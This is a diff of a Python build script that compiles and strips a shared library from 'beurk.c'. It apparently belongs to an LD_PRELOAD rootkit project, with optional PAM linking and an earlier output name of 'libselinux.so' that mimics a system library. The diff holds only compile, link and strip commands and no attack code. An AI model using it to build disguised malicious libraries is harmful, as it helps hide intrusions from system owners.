@@ -118,12 +118,18 @@ for key, val in os.environ.items():
 ###############################################################################
 ### compile library
 
+def run_build_command(cmd):
+    cmd = cmd.format(**config)
+    print(cmd)
+    if os.system(cmd) != 0:
+        sys.exit("%s: *** build command failed ***" % sys.argv[0])
+
 SOURCES = [
-        "beurk.c",
+        "src/beurk.c",
         ]
 
-CFLAGS = """
--Iinclude -Wall -Wextra
+config["CFLAGS"] = """
+-Iincludes -Wall -Wextra
 -Wdisabled-optimization -Winline
 -Wunsuffixed-float-constants
 -Wdouble-promotion -Wunknown-pragmas
@@ -131,18 +137,20 @@ CFLAGS = """
 -mtune=native
 """.replace("\n", " ")
 
-LDFLAGS = "-lc -ldl -lutil "
+config["LDFLAGS"] = "-lc -ldl -lutil "
 if config["ENABLE_PAM"]:
-    LDFLAGS += "-lpam "
+    config["LDFLAGS"] += "-lpam "
 
+# build objects from sources
 for source in SOURCES:
-    cmd = "{CC} -fPIC -g -c ".format(**config) + source
-    pprint(cmd)
+    dest = source.replace(".c", ".o")
+    run_build_command("{CC} {CFLAGS} -fPIC -g -c %s -o %s" % (source, dest))
 
+# build library from objects
 objects = " ".join([x.replace(".c", ".o") for x in SOURCES])
-a = "{CC} -fPIC -shared -Wl,-soname,{LIBRARY_NAME}"
-b = "{LDFLAGS} -o {LIBRARY_NAME}"
+run_build_command("{CC} -fPIC -shared -Wl,-soname,{LIBRARY_NAME} " \
+        + objects + " {LDFLAGS} -o {LIBRARY_NAME}")
 
-
-
-"strip libselinux.so"
+# strip if no debug mode
+if config["DEBUG_LEVEL"] == 0:
+    run_build_command("strip {LIBRARY_NAME}")
